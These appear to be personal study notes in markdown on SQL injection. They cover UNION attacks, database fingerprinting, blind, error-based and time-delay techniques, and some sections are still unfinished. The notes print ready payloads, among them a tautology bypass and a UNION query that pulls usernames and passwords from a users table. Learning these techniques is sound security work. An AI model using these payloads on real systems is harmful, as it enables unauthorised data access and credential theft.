qw# Retrieving hidden data

simple attack -> `'+OR+1=1--`  [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Retrieving hidden data#simple attack|example]]
# In-Band SQL injection 
## UNION attacks
##### concept:
<mark style="background: #FFB86CA6;">to retrieve data from other tables</mark> ->
- The individual queries must return the **same number of columns**.
- The **data types** in each column must be compatible between the individual queries.

### Examining the database [[SQLi#DBMS Identification |payloads]]
- database type and version [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Examining the database|examples]]
	- _Microsoft, MySQL_ -> `SELECT @@version`
	- _PostgreSQL_ -> `SELECT version()`
	- _Oracle_ -> `SELECT * FROM v$version`
### Listing the contents 
- _Oracle_ [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#Listing the contents|examples]]
  - `all_tables`
  - `all_tab_columns`
- _all other databases_ -> `information_schema` 
  - `information_schema.schemata` -> shows all database which the user has access to
  - `information_schema.tables` -> shows all tables which the user has access to
  - `information_schema.columns` -> shows all columns which the user has access to
```mysql 
select group_concat(column_name) from information_schema.columns where table_schema='DATABASE_NAME' and table_name='TABLE_NAME' #returns only column names for a specific database and table 
```
### 1) number of columns required
- use `ORDER BY` -> `' ORDER BY [number]--` until you hit an error
- use `UNION SELECT` -> `' UNION SELECT NULL,NULL[...]--` -> until additional row in the result set (it is possible to get erros like `NullPointerException` or even same response as without null ) 
**Note**: On _Oracle_ databases, every `SELECT` statement must specify a table to select -> use `from dual`
### 2) Finding columns with a useful data type

- interesting data type = normally string type -> `UNION SELECT` 
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
`Conversion failed when converting the varchar value 'a' to data type int.` -> probably not suitable 

### 3) retrieve interesting data
- for example username and password from a table called users:
`' UNION SELECT username, password FROM users--`
#### multiple values within a single column
- use String Concatenation (different databases use different syntax) [[cheatsheet(portswigger)#String concatenation|see cheatsheet]]
	- example: `||` ->  `' UNION SELECT username || '~' || password FROM users--`  

# Inferential(Blind) SQL injection
##### concept:
-> when HTTP responses <mark style="background: #ADCCFFA6;">do not contain</mark> the *results of the relevant SQL query* or the *details of any database errors*.
### triggering conditional responses

1) the application does *behave differently(in response)* when faces with true/false conditional statement (example: `'1'='1` / `'1'='2`) in:
	- Parameters 
	- Cookies
	- HTTP Headers
2) determine the length of data you want to retrive using *`LENGTH`* 
3) use: 
	- Oracle: *`SUBSTR`*
	- non-Oracle: *`SUBSTRING`* [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#triggering conditional responses|example]]
## Error-based

### triggering conditional errors
- injecting different boolean conditions makes no difference to the application's responses -> *raise an error* by *injecting a condition query* -> use *`CASE`* keyword [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#triggering conditional errors|examples]]
### verbose SQL error messages

- verbose error -> find out about *context* -> easier to construct a valid query:
> `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

- generate an error message that *contains some of the data* that is returned by the query -> turns blind into visible -> use *`CAST()`* keyword: [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#verbose SQL error messages|example]]
>`CAST((SELECT example_column FROM example_table) AS int)`
>-> `ERROR: invalid input syntax for type integer: "Example data"`
## triggering time delays

 - application catches database errors and handles them -> *delay* in *execution* of the SQL *query* [[OLD/WEB/vulnerabilities/SQL Injection/attack/payload#triggering time delays|examples]]
look for syntax in different databases -> [[cheatsheet(portswigger)#Time delays|Here]]

## out-of-band (OAST) techniques
#todo 

# Second-order SQL injection 
#todo 


